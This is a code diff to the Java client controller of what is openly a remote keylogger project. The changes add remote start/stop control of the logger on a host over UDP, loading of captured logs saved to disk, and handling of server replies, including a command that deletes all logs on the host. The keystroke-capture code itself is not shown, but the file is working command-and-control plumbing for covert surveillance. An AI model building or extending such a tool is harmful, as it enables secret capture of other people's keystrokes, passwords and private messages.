@@ -7,6 +7,7 @@ import java.net.UnknownHostException;
 import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.StringTokenizer;
 
 import javax.swing.JFrame;
 
@@ -18,6 +19,8 @@ import com.hao.keylogger.views.ClientView;
 public class ClientLogController {
 	private ClientView view;
 	ArrayList<Log> logs = new ArrayList<Log>();
+
+	private boolean isLoggerRunning = true;
 
 	public ClientLogController(ClientView view) {
 		super();
@@ -73,9 +76,14 @@ public class ClientLogController {
 	public void receiveLogFromServer(ArrayList<Log> logs) {
 		if (logs.size() == 0) {
 			view.showInfoMessage("Key logger", "No logs fetched");
+			view.setLogList(new ArrayList<String>());
 			return;
 		}
 		this.logs = logs;
+		updateViewWhenLogListChanged();
+	}
+
+	private void updateViewWhenLogListChanged() {
 		ArrayList<String> logListNames = new ArrayList<String>();
 		for (Log log : logs) {
 			logListNames.add(log.getName());
@@ -96,7 +104,8 @@ public class ClientLogController {
 		Log log = logs.get(logListSelectedIndex);
 		try {
 			writeToFile(log);
-			view.showInfoMessage("Save log", "Log was saved at\n" + new File(Resources.LOGS_CLIENT_DIRECTORY).getAbsolutePath());
+			view.showInfoMessage("Save log",
+					"Log was saved at\n" + new File(Resources.LOGS_CLIENT_DIRECTORY).getAbsolutePath());
 		} catch (IOException e) {
 			e.printStackTrace();
 			view.showErrorMessage("Save log", "Error: \n" + e.getMessage());
@@ -104,7 +113,8 @@ public class ClientLogController {
 	}
 
 	private void writeToFile(Log log) throws IOException {
-		String filePath = Resources.LOGS_CLIENT_DIRECTORY + File.separator + log.getName() + Resources.LOG_FILE_EXTENSION;
+		String filePath = Resources.LOGS_CLIENT_DIRECTORY + File.separator + log.getName()
+				+ Resources.LOG_FILE_EXTENSION;
 		FileManager fm = new FileManager(filePath);
 		fm.writeToFile(log.getContent());
 	}
@@ -130,33 +140,80 @@ public class ClientLogController {
 		try {
 			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).deleteAllHostLogs();
 		} catch (SocketException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (UnknownHostException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
 
-	public void stopLoggerRemote() {
+	public void toggleLoggerRemote() {
 		try {
-			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).stopLogger();
+			if (isLoggerRunning) {
+				new UDPClientHelper(this, view.getHostAddress(), view.getPort()).stopLogger();
+			} else {
+				new UDPClientHelper(this, view.getHostAddress(), view.getPort()).startLogger();
+			}
 		} catch (SocketException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (UnknownHostException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
+
 	}
 
 	public void loadAllSavedLogs() {
-		// TODO Auto-generated method stub
-		
+		File logFolder = new File(Resources.LOGS_CLIENT_DIRECTORY);
+		File[] logFiles = logFolder.listFiles();
+		if (logFiles.length > 0) {
+			for (File f : logFiles) {
+				Log log = new Log();
+				FileManager fm = new FileManager(f.getPath());
+				String content = "";
+				try {
+					content = fm.readAll();
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+				log.setContent(content);
+				logs.add(log);
+			}
+			updateViewWhenLogListChanged();
+		}
 	}
 
 	public void receiveMessageFromServer(String msg) {
-		view.showInfoMessage("Key logger", msg);
+		StringTokenizer strTokenizer = new StringTokenizer(msg, "?");
+		String request = strTokenizer.nextToken();
+		boolean isSuccessful = new Boolean(strTokenizer.nextToken());
+		String serverMsg = strTokenizer.nextToken();
+		switch (request) {
+		case Resources.DELETE_ALL_HOST_LOGS:
+			if (isSuccessful) {
+				view.showInfoMessage("Key logger - Delete host logs result", serverMsg);
+			} else {
+				view.showErrorMessage("Key logger - Delete host logs result", serverMsg);
+			}
+			break;
+		case Resources.STOP_LOGGER:
+			if (isSuccessful) {
+				view.updateMenuItemWhenLoggerStop();
+				view.showInfoMessage("Key logger - Stop logger", serverMsg);
+				isLoggerRunning = false;
+			} else {
+				view.showErrorMessage("Key logger - Stop logger", serverMsg);
+			}
+			break;
+		case Resources.START_LOGGER:
+			if (isSuccessful) {
+				view.updateMenuItemWhenLoggerStart();
+				view.showInfoMessage("Key logger - Start logger", serverMsg);
+				isLoggerRunning = true;
+			}
+			else {
+				view.showErrorMessage("Key logger - Start logger", serverMsg);
+			}
+			break;
+		}
 	}
 
 }
